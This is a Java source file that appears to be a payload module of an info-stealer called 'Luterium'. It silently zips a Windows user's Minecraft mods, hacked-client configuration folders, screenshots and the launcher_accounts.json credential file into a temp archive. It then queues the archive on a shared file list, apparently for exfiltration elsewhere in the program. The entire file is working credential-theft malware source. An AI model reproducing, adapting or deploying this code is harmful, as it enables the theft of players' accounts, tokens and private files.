package dev.peter.luterium.features;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

import static dev.peter.luterium.Main.fileList;

/**
 * @author Peter
 * @since 09/29/2025
 * Gets Minecraft-related files (MCScreenshots but entirely rewritten).
 */

public class Minecraft implements PayloadExecutor {
    String tempPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\";
    String mainPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofMC\\";
    String mainZipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofMC.zip";

    String[][] paths = { //This IS NOT easy to use, but I don't care
            {"oofMods.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\mods")}, //Mods
            {"oofRise.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\Rise")}, //RiseClient
            {"oofSS.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\screenshots")}, //Screenshots
            {"oofEarth.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\earthhack")}, //FDPClient
            {"oofFDP.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\FDPCLIENT-1.8")}, //Earthhack
            {"oofRusher.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\rusherhack")} //Rusherhack
    };
    Optional<File> launcherAccs = FileUtil.getFile(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json"); //MC Launcher Accounts

    @Override
    public void execute() throws Exception {
        List<File> zipList = new ArrayList<File>();

        //Iterates through paths[][], packs each folder and add them to zipList (actually, paths[][] is easy to use)
        for (String[] strings : paths) {
            File zip = new File(tempPath + strings[0]);
            File path = new File(strings[1]);

            if(path.exists()) {
                ZipUtil.pack(path, zip);

                zipList.add(zip);
            }
        }

        //Creates mainPath if it doesn't exist
        File mainDir = new File(mainPath);
        if (!mainDir.exists()) {
            mainDir.mkdirs();
        } else {
            mainDir.delete();
            mainDir.mkdirs();
        }

        //Moves all zips to the oofMC folder
        for(File file : zipList) {
            Files.move(file.toPath(),
                    (new File(mainPath + file.getName())).toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
        }

        //Creates the file array with or without launcherAccs, depending on whether it exists or not
        File[] entries;
        entries = launcherAccs.map(file -> new File[]{
                mainDir,
                file
        }).orElseGet(() -> new File[]{
                mainDir
        });

        //Packs everything to mainZipPath and deletes mainPath
        ZipUtil.packEntries(entries, new File(mainZipPath));
        mainDir.delete();

        //Adds mainZipPath to fileList
        Optional<File> file = FileUtil.getFile(mainZipPath);
        file.ifPresent(archive -> {
            fileList.add(archive);
        });
    }
}
